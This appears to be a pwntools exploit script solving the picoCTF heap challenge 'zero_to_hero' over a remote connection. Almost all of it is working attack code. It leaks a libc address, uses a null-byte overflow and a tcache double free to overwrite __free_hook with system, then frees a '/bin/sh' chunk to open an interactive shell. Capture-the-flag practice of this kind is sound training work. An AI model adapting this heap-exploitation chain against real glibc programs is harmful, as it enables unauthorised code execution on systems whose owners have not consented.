from pwn import *

# p = process('./zero_to_hero', env={"LD_PRELOAD":"./libc.so.6"})
p = remote('jupiter.challenges.picoctf.org', 10089)
libc = ELF('./libc.so.6')
elf = ELF('./zero_to_hero')
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript='''
#                                     b *0x400C62
#                                     continue 
#                                     ''')

def initialize(answer):
    p.recv()
    p.send(answer)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendlineafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def solve():
    initialize('y')
    p.recvuntil(': ')
    system = int(re.findall('0x[0-9a-f]*', p.recvuntil('\n'))[0], 16)
    libc.address = system - libc.symbols['system']
    free_hook = libc.symbols['__free_hook']
    log.info('system: %s'%hex(system))
    log.info('free hook: %s'%hex(free_hook))
    add(0x58, 'A'*0x58)      # A
    add(0x140, 'B'*0x140)      # B
    
    free(0)
    free(1)
    add(0x58, '/bin/sh\x00' + 'A'*0x50)        # NULL byte overflow chunk B => B'size is 0x100

    free(1)             # now chunk B has size 0x100 => bypass key check in tcache  => double free

    add(0x140, 'C'*0x140)
    free(3)             # double free in tcache 0x100

    add(0xf0, p64(free_hook))
    add(0xf0, 'A')
    add(0xf0, p64(system))
    free(0)
    p.interactive()
if __name__ == '__main__':
    solve()